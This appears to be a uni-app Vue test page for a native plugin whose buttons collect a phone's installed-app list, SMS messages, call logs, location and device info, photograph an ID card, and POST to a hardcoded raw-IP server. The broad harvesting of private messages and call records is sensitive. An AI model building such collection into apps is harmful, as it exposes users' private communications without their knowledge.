<template>
    <view class="container">

        <view class="intro">本项目已包含uni ui组件，无需import和注册，可直接使用。在代码区键入字母u，即可通过代码助手列出所有可用组件。光标置于组件名称处按F1，即可查看组件文档。</view>
        <text class="intro">详见：</text>
        <uni-link :href="href" :text="href"></uni-link>
        <button @click="test()">test</button>
        <button type="primary" @click="getInstall">获取安装列表数据</button>
        <button type="primary" @click="getSMSList">获取短信数据</button>
        <button type="primary" @click="getLocation">获取位置数据</button>
        <button type="primary" @click="getCallLogList">获取通话记录数据</button>
        <button type="primary" @click="getDeviceInfo">获取设备信息数据</button>
        <button type="primary" @click="getGoCamera">拍身份证</button>
        <button type="primary" @click="getGoCameraVideo">视频录制</button>
        <button type="primary" @click="openAlbum(false)">单选图片</button>
        <button type="primary" @click="openAlbum(true)">多选图片</button>
        <button type="primary" @click="initAf">初始化AF</button>
    </view>
</template>

<script>
    const wtModule = uni.requireNativePlugin('WTUniPlugin-WTModule');
    export default {
        data() {
            return {
                href: 'https://uniapp.dcloud.io/component/README?id=uniui',
                url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju'
            }
        },
        methods: {
            getInstall() { // 获取安装列表
                wtModule.getAppList((ret) => {
                    console.log(ret)
                })
            },
            getSMSList() { // 短信
                wtModule.getSMSList((ret) => {
                    this.text = ret
                })
            },
            getLocation() { // 获取位置
                wtModule.getLocation((ret) => {
                    this.text = ret
                })
            },
            getCallLogList() { // 获取通话记录
                wtModule.getCallLog((ret) => {
                    this.text = ret
                })
            },
            getDeviceInfo() {
                wtModule.getMobileInfo((ret) => {
                    this.text = ret
                })
            },
            getGoCamera() { // 拍身份证
                wtModule.takePhoto({
                    type: 1
                }, (ret) => {
                    this.text = ret
                })
            },
            getGoCameraVideo() { // 视频录制
                wtModule.takePhoto({
                    type: 2
                }, (ret) => {
                    this.text = ret
                })
            },
            openAlbum(isMultiple) { // 图片选择
                wtModule.takePhoto({
                    isMultiple: isMultiple
                }, (ret) => {
                    this.text = ret
                })
            },
            initAf() { // 初始化AF
                wtModule.initAf((ret) => {
                    this.text = ret
                })
            },

            test() {
                //             plus.android.requestPermissions([ 
                // 'android.permission.READ_CALL_LOG' 
                //             ], function(e) {
                //                 console.log(e)
                //             });
                // let appurl = "market://details?id=io.dcloud.HelloH5"; 
                // plus.runtime.openURL(appurl, function(res) {
                // console.log(res);
                // });
                // uni.openAppAuthorizeSetting({
                //   success (res) {
                //     console.log(res)
                //   }
                // })
                // uni.navigateTo({
                //     url: '/pages/web/index'
                // })
                let data = {
                    // androidversion: 'android10',
                    // appVersion: '1.0.1',
                    // deviceID: 'tdfafafafdaf',
                    // i18n: 'zh_CN',
                    // ownerShip: 'tgwb1',
                    // phoneName: 'iphone13proMax',
                    // reqSource: 'Android',
                    // webVersion: 'H5'
                    stopwatch: "sys_permission_list_content"
                }
                console.log('开始请求')
                uni.request({
                    url: this.url,
                    method: 'POST',
                    data: data,
                    header: {
                        'content-type': 'application/json;',
                        'encrypted': '0',
                        'encryptType': '0',
                        'ownerShip': 'tgwb1_ios',
                        'disturbedUrl': '0',
                        'disturbedPar': '1'
                    },
                    success: (res) => {
                        console.log(res)
                    },
                    // 
                    fail: (err) => {
                        console.log(err)
                    }
                })
            },
        }
    }
</script>

<style>
    .container {
        padding: 20px;
        font-size: 14px;
        line-height: 24px;
    }
</style>